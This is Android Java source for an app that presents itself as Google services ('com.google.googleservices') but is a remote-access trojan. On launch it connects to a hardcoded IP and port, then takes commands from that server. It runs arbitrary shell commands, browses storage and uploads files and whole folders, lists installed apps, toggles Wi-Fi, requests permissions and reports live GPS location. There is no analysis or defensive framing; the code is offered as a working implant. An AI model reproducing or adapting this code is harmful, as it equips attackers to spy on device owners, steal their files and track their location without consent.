package com.google.googleservices;


import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Application;
import android.content.Context;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.location.Location;

import android.location.LocationListener;
import android.location.LocationManager;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;


import com.google.android.gms.location.FusedLocationProviderClient;

import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.googleservices.R;


import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;

import java.io.IOException;
import java.io.InputStreamReader;

import java.io.PrintWriter;
import java.net.Socket;
import java.nio.file.Files;

import java.nio.file.Paths;
import java.util.ArrayList;

import java.util.List;
import java.util.concurrent.Executor;


public class MainActivity extends AppCompatActivity {


    private String current_location = "null";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        connect thread = new connect();
        thread.start();


    }

    class connect extends Thread {

        String currentpath = Environment.getExternalStorageDirectory().toString();


        @RequiresApi(api = Build.VERSION_CODES.O)
        @Override
        public void run() {

            Socket server = conect_to_server();

            String output;
            while (true) {
                String cmd = get_cmd(server);
                if (cmd.startsWith("shell ")) {
                    output = shell(cmd.replace("shell ", ""));

                } else if (cmd.startsWith(("ask"))) {
                    output = ask_permission(cmd);

                } else {
                    output = commands(server, cmd);
                }
                send(server, "output size: " + output.length() + "\n" + output);
            }
        }

        Socket conect_to_server() {
            Socket sock = null;

            try {
                sock = new Socket("3.1.5.104", 4422);
                send(sock, "hello");

                String text = recv(sock);
                Log.d("from server", text);

            } catch (IOException e) {
                e.printStackTrace();
            }
            return sock;
        }

        void send(Socket sock, String text) {
            String text_size = (String.valueOf(text.length()));
            Log.d("text size", text_size);
            try {
                PrintWriter outs = new PrintWriter(sock.getOutputStream(), true);
                outs.println("buffer: " + text_size);
            } catch (IOException e) {
                e.printStackTrace();
            }

            Log.d("recv", recv(sock));
            try {
                PrintWriter outs = new PrintWriter(sock.getOutputStream(), true);

                outs.println(text);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }


        String recv(Socket sock) {
            String str = "null";

            try {
                BufferedReader br = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                str = br.readLine();

            } catch (IOException e) {
                e.printStackTrace();
            }
            return str;
        }

        String get_cmd(Socket server) {
            String cmd = "null";

            cmd = recv(server);


            return cmd;
        }

        String wifi(String cmd) {
            Boolean status = null;
            String output = "null";
            if (cmd.contains("on")) {
                status = true;
                output = "Turning on wifi";
            } else if (cmd.contains("off")) {
                status = false;
                output = "Turning off wifi";
            }
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            wifiManager.setWifiEnabled(status);
            return output;
        }


        @RequiresApi(api = Build.VERSION_CODES.O)
        String commands(Socket server, String cmd) {

            String output = "null";


            if (cmd.startsWith("turn")) {

                if (cmd.contains("wifi")) {
                    output = wifi(cmd);
                }

            } else if (cmd.startsWith("ls")) {
                List<String> files = null;
                final String state = Environment.getExternalStorageState();

                if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
                    String location_to_ls = "null";
                    try {
                        if (cmd.replace("ls", "") != "") {
                            location_to_ls = currentpath + "/" + cmd.replace("ls ", "");

                        } else {
                            location_to_ls = currentpath;
                        }
                        files = ls(new File(location_to_ls));
                        output = files.toString();
                        Log.d("files", output);
                    } catch (Exception e) {
                        output = "No such directory or permission denied: " + location_to_ls;
                    }
                }

            } else if (cmd.startsWith("cd ")) {
                output = cd(server, cmd);
            } else if (cmd.startsWith("list apps")) {
                output = list_all_apps();
            } else if (cmd.startsWith("pwd")) {
                output = currentpath;
            } else if (cmd.startsWith("download ")) {
                send(server, "downloading");

                cmd = cmd.split("download ")[1];
                download2(server, cmd);
                output = "donwload complete";

            } else if (cmd.startsWith("location")) {
                if (cmd.contains("scan")) {
                    output = loc_call("scan");

                }
                else if (cmd.contains(("stop"))){
                    output = loc_call("stop");
                }
                else{
                    output = getlocation2();
                }
            }
            return output;
        }


        @RequiresApi(api = Build.VERSION_CODES.O)
        void download2(Socket server, String requested_file) {
            String output = "null";

            String file_to_download_loc = currentpath + "/" + requested_file;
            File file = new File(file_to_download_loc);


            if (file.isDirectory()) {

                List<String> all_files = getallfiles(file);
                send(server, "dir");

                send(server, requested_file);

                send(server, "number_of_files: " + all_files.size());

                for (String file1 : all_files) {

                    download2(server, requested_file + "/" + file1);

                }
            } else if (file.isFile()) {
                send(server, "file");
                downloadfile(server, file_to_download_loc, requested_file);
                recv(server);
                send(server, "ok");


            }


        }

        @RequiresApi(api = Build.VERSION_CODES.O)
        void downloadfile(Socket server, String file_to_download, String requested_file) {
            try {
                File file = new File(file_to_download);
                send(server, "downloading " + requested_file);

                byte[] image_array = Files.readAllBytes(Paths.get(file_to_download));
                DataOutputStream dos = new DataOutputStream(server.getOutputStream());

                dos.writeInt(image_array.length);
                dos.write(image_array);

            } catch (Exception e) {
                e.getStackTrace();
            }
        }

        private List<String> getallfiles(File directory) {
            Log.d("filesofdir", "Directory: " + directory.getAbsolutePath() + "\n");

            final File[] files = directory.listFiles();
            List<String> files2 = new ArrayList<String>();
            if (files != null) {
                for (File file : files) {
                    if (file != null) {
                        if (file.isDirectory()) {
                            files2.add(file.getName());
                        } else {
                            files2.add(file.getName());

                        }
                    }
                }
            }
            return files2;
        }

        private List<String> ls(File directory) {
            Log.d("filesofdir", "Directory: " + directory.getAbsolutePath() + "\n");

            final File[] files = directory.listFiles();
            List<String> files2 = new ArrayList<String>();
            ;
            if (files != null) {
                for (File file : files) {
                    if (file != null) {
                        Log.d("filesofdir", file.getName() + "\n");
                        files2.add(file.getName());
                    }
                }
                return files2;
            }

            return null;
        }

        String cd(Socket server, String cmd) {
            send(server, "currentpath: " + currentpath);
            String output = recv(server);
            currentpath = output.split("newpath:")[1];
            return "current path set to:" + currentpath;
        }

        String list_all_apps() {
            try {
                final PackageManager pm = getPackageManager();

                List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                String all_apps = null;


                for (ApplicationInfo packageInfo : packages) {
                    ApplicationInfo appinfo = pm.getApplicationInfo(packageInfo.packageName, 0);
                    all_apps = all_apps + "\n" + appinfo.loadLabel(pm);
                }
                return all_apps;
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }
            return "failed to load apps";
        }

        String shell(String cmd) {

            Process process = null;
            try {
                process = Runtime.getRuntime().exec(cmd);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                int read;
                char[] buffer = new char[4096];
                StringBuffer output = new StringBuffer();
                while ((read = bufferedReader.read(buffer)) > 0) {
                    output.append(buffer, 0, read);
                }
                bufferedReader.close();

                BufferedReader bufferedReader2 = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                int read2;
                char[] buffer2 = new char[4096];
                StringBuffer output2 = new StringBuffer();
                while ((read2 = bufferedReader2.read(buffer2)) > 0) {
                    output2.append(buffer2, 0, read2);
                }
                bufferedReader2.close();
                // Waits for the command to finish.
                process.waitFor();
                String output3 = output.toString() + output2.toString();
                Log.d("shell_command ", output3);

                return output3;

            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
            return "error";
        }




        String loc_call(String action){
            if (action.contains("scan")) {
                if ((ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED)) {
                    Runnable r = new Runnable() {
                        public void run() {
                            scan_loc();
                        }
                    };

                    MainActivity.this.runOnUiThread(r);
                    return "Scanning";
                } else {
                    return "Permission denied";
                }
            }
            else if (action.contains("stop")){

                Runnable r = new Runnable() {
                    public void run() {
                        stop_loc();
                    }
                };

                MainActivity.this.runOnUiThread(r);
            }
            return "Stopped";
        }

        String getlocation2(){
            return current_location;
        }

    }
    LocationManager locationManager;
    @SuppressLint("MissingPermission")
    void scan_loc() {


        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);


        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0,loc_listen);




    }

    void stop_loc(){
        locationManager.removeUpdates(loc_listen);
    }
    LocationListener loc_listen=new LocationListener() {

        @Override
        public void onLocationChanged(Location location) {
            current_location = "Latitude: " + location.getLatitude() + "Longitude: " + location.getLongitude();

        }

        @Override
        public void onStatusChanged(String s, int i, Bundle bundle) {

        }

        @Override
        public void onProviderEnabled(String s) {

        }

        @Override
        public void onProviderDisabled(String s) {

        }
    };


    @RequiresApi(api = Build.VERSION_CODES.M)
    String ask_permission(String cmd) {
        String output = "null";
        if (cmd.contains("storage")) {

            if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED) {
                output = "Permission already granted";

            } else {

                output = "Permission asked";
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);

            }
        } else if (cmd.contains("location")) {
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED) {
                output = "Permission already granted";

            } else {

                output = "Permission asked";
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 1);

            }
            if (checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED) {
                output = "Permission already granted";

            } else {

                output = "Permission asked";
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_COARSE_LOCATION}, 1);
            }

        }

        return output;
    }

}

